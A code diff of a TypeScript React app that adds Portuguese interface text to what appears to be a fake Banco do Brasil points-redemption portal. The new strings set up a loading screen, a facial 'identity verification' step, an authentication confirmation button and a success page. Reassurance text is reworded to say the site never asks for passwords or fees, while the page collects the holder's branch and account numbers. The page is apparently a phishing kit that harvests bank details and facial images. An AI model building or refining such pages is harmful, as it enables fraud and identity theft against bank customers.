@@ -27,11 +27,21 @@ const FALLBACK_SETTINGS: SiteSettings = {
     title: 'Confirme seus dados para concluir sua solicitação de resgate.',
     subtitle: 'Informe os dados da conta corrente de sua titularidade para depósito.',
     infoText:
-      'A solicitação será analisada e processada para a conta corrente informada. Nunca solicitamos senha bancária, código de autenticação ou token.',
+      'A solicitação será analisada e processada para a conta corrente informada. Nunca solicitamos senha bancária, código de autenticação pessoal ou cobrança de taxa.',
     bankLabel: 'Banco do Brasil — 001',
     depositInstructions:
       'Informe agência, dígito da agência (quando aplicável), conta corrente e dígito da conta vinculados ao titular cadastrado.',
     showAgencyDigit: true,
+    loadingTitle: 'CONECTANDO...',
+    loadingSubtitle: 'Carregando seus dados cadastrais. Aguarde...',
+    facialTitle: 'VERIFICAÇÃO DE IDENTIDADE',
+    facialInstructions: 'Posicione seu rosto dentro da área indicada para realizar a verificação.',
+    facialButtonText: 'INICIAR VERIFICAÇÃO FACIAL',
+    authButtonText: 'VALIDAR CONFIRMAÇÃO',
+    finalTitle: 'SOLICITAÇÃO DE RESGATE RECEBIDA!',
+    finalSubtitle: 'Seus dados foram enviados com sucesso. Acompanhe o processamento do seu resgate.',
+    finalInfoText:
+      'Pedido em análise cadastral e bancária. A previsão de depósito será confirmada após a aprovação da solicitação pelo setor responsável.',
     convertButtonText: 'CONVERTER PONTOS EM REAIS',
     ownershipButtonText: 'CONFIRMAR TITULARIDADE',
     requestButtonText: 'SOLICITAR RESGATE',
@@ -137,6 +147,7 @@ export default function App() {
     <PublicPortal
       settings={settings}
       storageError={storageError}
+      onSettingsUpdated={(next) => setSettings(next)}
       onNavigate={navigate}
     />
   );
